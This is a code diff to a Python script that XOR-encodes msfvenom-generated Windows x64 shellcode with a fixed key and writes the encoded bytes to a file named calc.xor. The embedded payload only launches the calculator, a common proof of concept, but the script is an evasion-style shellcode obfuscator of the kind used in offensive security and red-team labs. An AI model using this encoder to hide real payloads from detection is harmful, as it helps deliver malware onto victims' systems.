@@ -1,3 +1,5 @@
+import sys
+
 
 # msfvenom -p windows/x64/exec CMD="cmd.exe /C calc.exe" EXITFUNC=thread
 # --platform windows -a x64 -b "\x00\x0a\x0d" -e <any invalid encoder> -f py -v buf
@@ -30,9 +32,17 @@ buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
 buf += b"\xda\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f"
 buf += b"\x43\x20\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
 
-buf = b"CreateRemoteThread"
 key = b"shellcodefacile"
+
+# with open(sys.argv[1], "rb") as f:
+#     data = f.read(1)
+#     while data:
+#        buf += "{}".format(data.hex())
+#        data = f.read(1)
+# buf = bytes.fromhex(buf)
+
 xored_string = list()
+xored_hex_string = list()
 
 buf_length = len(buf)
 key_length = len(key)
@@ -43,8 +53,9 @@ print("data: {" +",".join(["0x{:02x}".format(buf[i]) for i in range(buf_length)]
 for i in range(buf_length):
     k = key[i % key_length]
     xored_string.append("0x{:02x}".format(buf[i] ^ k))
+    xored_hex_string.append("{:02x}".format(buf[i] ^ k))
 
 print("xored: {"+",".join(xored_string)+"}")
 
-# with open("calc.xor", "wb") as f:
-#     f.write(bytes("\\"+"\\".join(xored_string), "utf-8"))
+with open("calc.xor", "wb") as f:
+    f.write(bytes.fromhex("".join(xored_hex_string)))
